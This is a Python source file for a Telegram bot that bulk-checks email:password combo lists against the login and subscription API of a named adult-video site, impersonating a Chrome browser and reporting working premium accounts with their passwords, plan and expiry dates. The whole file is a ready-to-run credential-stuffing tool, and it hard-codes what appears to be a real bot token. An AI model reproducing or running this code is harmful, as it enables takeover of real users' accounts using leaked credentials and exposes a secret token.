"""
FAPHOUSE ACCOUNT CHECKER — TELEGRAM BOT
========================================
Setup:
  pip install curl_cffi python-telegram-bot

Usage:
  1. Create a bot via @BotFather, get your token
  2. Set BOT_TOKEN below
  3. python faphouse_bot.py

Commands in Telegram:
  /start   — welcome message
  /check email:password  — check a single account
  /help    — show usage
  Send a .txt combo file — bulk check (one email:pass per line)
"""

import os
import time
import logging
import asyncio
from datetime import datetime
from curl_cffi import requests as cffi_requests

from telegram import Update, Document
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.constants import ParseMode

# ── CONFIG ──────────────────────────────────────────────────────────────────
BOT_TOKEN = "8542796779:AAExwV8POqvTjj72aHInQsAmsLjbiDeX0Ac"   # ← paste your token here
DELAY     = 0.8                     # seconds between combo checks
# ────────────────────────────────────────────────────────────────────────────

BASE_TV  = "https://faphouse.tv"
BASE_COM = "https://faphouse.com"

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
}

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

# ── CORE LOGIC (unchanged) ───────────────────────────────────────────────────

def get_cookies(session):
    try:
        return list(session.cookies.keys())
    except Exception:
        return []

def check_account(email: str, password: str) -> dict:
    """
    Returns a dict:
      status  : 'hit' | 'free' | 'error'
      username: str
      user_id : str
      plan    : str
      exp     : str
      start   : str
      renew   : str
      reason  : str  (only on error)
    """
    session = cffi_requests.Session(impersonate="chrome110")

    try:
        session.get(BASE_TV,  headers={**HEADERS, 'Referer': BASE_TV + '/'})
        session.get(BASE_COM, headers={**HEADERS, 'Referer': BASE_COM + '/'})
        session.get(f"{BASE_COM}/sign-in", headers={**HEADERS, 'Referer': BASE_COM + '/'})

        login_headers = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': BASE_COM,
            'Referer': f'{BASE_COM}/sign-in',
        }

        payload = {
            "login": email,
            "password": password,
            "rememberMe": "1",
            "recaptcha": "",
            "trackingParamsBag": (
                "eyJwcm9tb19pZCI6IiIsInZpZGVvX2lkIjpudWxsLCJzdHVkaW9faWQiOm51bGwsIn"
                "Byb2R1Y2VyX2lkIjpudWxsLCJvcmllbnRhdGlvbiI6InN0cmFpZ2h0IiwibWxfcGFn"
                "ZSI6Im1haW5fcGFnZSIsIm1sX3BhZ2VfdmFsdWVfaWQiOm51bGwsIm1sX3BhZ2Vf"
                "dmFsdWUiOm51bGwsIm1sX3BhZ2VfbnVtYmVyIjpudWxsLCJtbF9yZWZfcGFnZV92"
                "YWx1ZV9pZCI6bnVsbCwibWxfcmVmX3BhZ2VfdmFsdWUiOiIiLCJtbF9yZWZfcGFn"
                "ZV9udW1iZXIiOm51bGwsIm1sX3JlZl9wYWdlIjoiZGlyZWN0In0="
            )
        }

        login_res = session.post(
            f"{BASE_COM}/api/auth/signin",
            headers=login_headers,
            json=payload,
            allow_redirects=False
        )

        if login_res.status_code != 200:
            return {"status": "error", "reason": f"HTTP {login_res.status_code}"}

        login_data = login_res.json()
        if not login_data.get("success"):
            return {"status": "error", "reason": str(login_data)[:120]}

        username = login_data.get("username", "N/A")
        user_id  = str(login_data.get("userId", "N/A"))
        has_gold = login_data.get("hasGoldSubscription", False)

        plan       = "FREE"
        exp        = "N/A"
        start      = "N/A"
        auto_renew = "N/A"

        sub_res = session.get(
            f"{BASE_COM}/api/subscription/get",
            headers={'Accept': 'application/json', 'Referer': BASE_COM + '/'}
        )

        if sub_res.status_code == 200:
            sub = sub_res.json()
            if sub.get("isUltra"):
                plan = "ULTRA"
            elif sub.get("hasGoldSubscription") or has_gold:
                plan = "PREMIUM"
            exp        = sub.get("expiredAt", "N/A")
            start      = sub.get("startedAt", "N/A")
            auto_renew = "Yes" if sub.get("autoRenew") else "No"
        elif has_gold:
            plan = "PREMIUM"

        is_premium = plan in ("ULTRA", "PREMIUM")

        return {
            "status"  : "hit" if is_premium else "free",
            "username": username,
            "user_id" : user_id,
            "plan"    : plan,
            "exp"     : str(exp),
            "start"   : str(start),
            "renew"   : auto_renew,
        }

    except Exception as e:
        return {"status": "error", "reason": str(e)[:120]}

# ── MESSAGE FORMATTERS ───────────────────────────────────────────────────────

def fmt_hit(email, password, r) -> str:
    return (
        "✅ <b>HIT — Premium Account</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📧 <b>Email</b>    : <code>{email}</code>\n"
        f"🔑 <b>Password</b> : <code>{password}</code>\n"
        f"👤 <b>Username</b> : {r['username']}\n"
        f"🆔 <b>User ID</b>  : {r['user_id']}\n"
        f"💎 <b>Plan</b>     : {r['plan']}\n"
        f"📅 <b>Started</b>  : {r['start']}\n"
        f"📅 <b>Expires</b>  : {r['exp']}\n"
        f"🔄 <b>Renew</b>    : {r['renew']}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━"
    )

def fmt_free(email, password, r) -> str:
    return (
        "🆓 <b>FREE Account</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📧 <b>Email</b>    : <code>{email}</code>\n"
        f"🔑 <b>Password</b> : <code>{password}</code>\n"
        f"👤 <b>Username</b> : {r['username']}\n"
        f"🆔 <b>User ID</b>  : {r['user_id']}\n"
        f"💳 <b>Plan</b>     : FREE\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━"
    )

def fmt_error(email, password, r) -> str:
    return (
        "❌ <b>ERROR</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📧 <b>Email</b>    : <code>{email}</code>\n"
        f"🔑 <b>Password</b> : <code>{password}</code>\n"
        f"⚠️ <b>Reason</b>   : {r.get('reason', 'Unknown')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━"
    )

def format_result(email, password, r) -> str:
    if r["status"] == "hit":
        return fmt_hit(email, password, r)
    elif r["status"] == "free":
        return fmt_free(email, password, r)
    else:
        return fmt_error(email, password, r)

# ── BOT HANDLERS ─────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔍 <b>Faphouse Account Checker</b>\n\n"
        "Commands:\n"
        "  /check email:password — single check\n"
        "  /help — show this message\n\n"
        "Or send a <b>.txt combo file</b> for bulk checking\n"
        "(one <code>email:password</code> per line)",
        parse_mode=ParseMode.HTML
    )

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await cmd_start(update, ctx)

async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    args = " ".join(ctx.args).strip()

    if not args or ":" not in args:
        await update.message.reply_text(
            "❌ Usage: /check email:password",
            parse_mode=ParseMode.HTML
        )
        return

    email, password = args.split(":", 1)
    email    = email.strip()
    password = password.strip()

    msg = await update.message.reply_text(
        f"⏳ Checking <code>{email}</code>...",
        parse_mode=ParseMode.HTML
    )

    result = await asyncio.get_event_loop().run_in_executor(
        None, check_account, email, password
    )

    await msg.edit_text(
        format_result(email, password, result),
        parse_mode=ParseMode.HTML
    )

async def handle_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    doc: Document = update.message.document

    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Please send a .txt file with email:password combos.")
        return

    # Download file
    tg_file = await ctx.bot.get_file(doc.file_id)
    content = bytes()
    import io
    buf = io.BytesIO()
    await tg_file.download_to_memory(buf)
    buf.seek(0)
    lines = [l.decode("utf-8", errors="ignore").strip() for l in buf.readlines()]
    combos = [l for l in lines if ":" in l]

    if not combos:
        await update.message.reply_text("❌ No valid combos found in file.")
        return

    stats = {"hits": 0, "free": 0, "errors": 0}

    status_msg = await update.message.reply_text(
        f"📋 Loaded <b>{len(combos)}</b> combos — starting check...\n\n"
        f"✅ Hits: 0  🆓 Free: 0  ❌ Errors: 0",
        parse_mode=ParseMode.HTML
    )

    for i, line in enumerate(combos, 1):
        email, password = line.split(":", 1)
        email    = email.strip()
        password = password.strip()

        result = await asyncio.get_event_loop().run_in_executor(
            None, check_account, email, password
        )

        stats[result["status"] if result["status"] in stats else "errors"] += 1

        # Send individual result
        await update.message.reply_text(
            format_result(email, password, result),
            parse_mode=ParseMode.HTML
        )

        # Update progress every 5 or on last
        if i % 5 == 0 or i == len(combos):
            await status_msg.edit_text(
                f"📊 Progress: <b>{i}/{len(combos)}</b>\n\n"
                f"✅ Hits: {stats['hits']}  "
                f"🆓 Free: {stats['free']}  "
                f"❌ Errors: {stats['errors']}",
                parse_mode=ParseMode.HTML
            )

        await asyncio.sleep(DELAY)

    # Final summary
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📊 <b>FINAL RESULTS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Hits   : <b>{stats['hits']}</b>\n"
        f"🆓 Free   : <b>{stats['free']}</b>\n"
        f"❌ Errors : <b>{stats['errors']}</b>\n"
        f"📋 Total  : <b>{len(combos)}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML
    )

# ── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌  Set your BOT_TOKEN first!")
        return

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help",  cmd_help))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_file))

    print("🤖  Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
